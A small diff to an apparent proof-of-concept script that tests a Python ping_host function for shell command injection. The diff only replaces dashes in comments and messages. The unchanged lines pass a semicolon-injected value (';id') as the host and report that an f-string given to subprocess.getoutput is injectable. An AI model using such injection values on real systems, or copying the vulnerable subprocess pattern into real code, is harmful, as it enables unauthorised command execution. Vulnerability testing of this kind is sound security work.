@@ -13,11 +13,11 @@ def ping_host(host: str) -> str:
 
 
 def main():
-    # Test 1: Benign input — normal behaviour
+    # Test 1: Benign input - normal behaviour
     r1 = ping_host("127.0.0.1")
     print(f"[Benign]  host=127.0.0.1  →  {r1!r}")
 
-    # Test 2: Semicolon injection — classic command injection
+    # Test 2: Semicolon injection - classic command injection
     r2 = ping_host(";id")
     print(f"[Inject]  host=;id        →  {r2!r}")
 
@@ -43,7 +43,7 @@ def main():
     if not success:
         if "uid=" in r2 or "uid=" in r3:
             success = True
-            print(f"\n[+] Command injection CONFIRMED — uid= found in response")
+            print(f"\n[+] Command injection CONFIRMED - uid= found in response")
 
     if success:
         print("\n=== VULNERABILITY CONFIRMED: subprocess.getoutput(f\"echo MEMO-PING {host}\") allows command injection ===")
